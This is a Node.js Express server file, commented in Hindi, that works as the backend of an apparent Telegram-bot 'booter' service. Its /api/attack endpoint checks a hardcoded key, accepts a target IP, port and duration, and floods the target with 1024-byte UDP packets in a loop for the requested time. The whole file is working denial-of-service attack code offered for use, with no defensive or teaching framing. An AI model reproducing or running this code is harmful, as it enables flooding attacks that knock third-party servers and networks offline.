const express = require('express');
const dgram = require('dgram'); // इनबिल्ट नेटवर्किंग सॉकेट लाइब्रेरी
const app = express();
const PORT = 6000; // पूरी तरह से खाली और सुरक्षित पोर्ट

// यह चेक करने के लिए कि आपका डोमेन काम कर रहा है या नहीं
app.get('/', (req, res) => {
    res.send("API Server is alive and working!");
});

// मुख्य रास्ता: /api/attack
app.get('/api/attack', (req, res) => {
    // आपकी बॉट फ़ाइल से आ रहे पैरामीटर्स को पढ़ना
    const { key, target, port, time } = req.query;

    // 1. सीक्रेट की-वेरिफिकेशन (Strict Authentication Check)
    if (!key || key !== "ARX@9044") {
        return res.status(401).send("Unauthorized: Invalid API Key");
    }

    // 2. पैरामीटर्स की जांच
    if (!target || !port || !time) {
        return res.status(400).send("Parameters missing");
    }

    const targetPort = parseInt(port);
    const duration = parseInt(time) * 1000; // सेकंड को मिलीसेकंड में बदलें
    const client = dgram.createSocket('udp4');
    const packetData = Buffer.alloc(1024, 'X'); // 1024 बाइट्स का डेटा पैकेट

    const endTime = Date.now() + duration;

    // 3. इनबिल्ट UDP नेटवर्क लॉजिक (Direct Socket Engine)
    function flood() {
        if (Date.now() < endTime) {
            client.send(packetData, 0, packetData.length, targetPort, target, (err) => {
                if (!err) {
                    // बिना रुके लगातार पैकेट्स भेजने के लिए लूप होल्ड रखना
                    setImmediate(flood); 
                }
            });
        } else {
            client.close();
            console.log(`Transmission finished for target ${target}`);
        }
    }

    // बैकग्राउंड में प्रोसेस शुरू करें
    flood();

    // टेलीग्राम बॉट को तुरंत सफलता का रिस्पॉन्स (Status 200) भेजें
    return res.status(200).send("Attack started");
});

// एक्सप्रेस सर्वर को पोर्ट 6000 पर चालू रखना
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Professional Inbuilt API running successfully on port ${PORT}`);
});
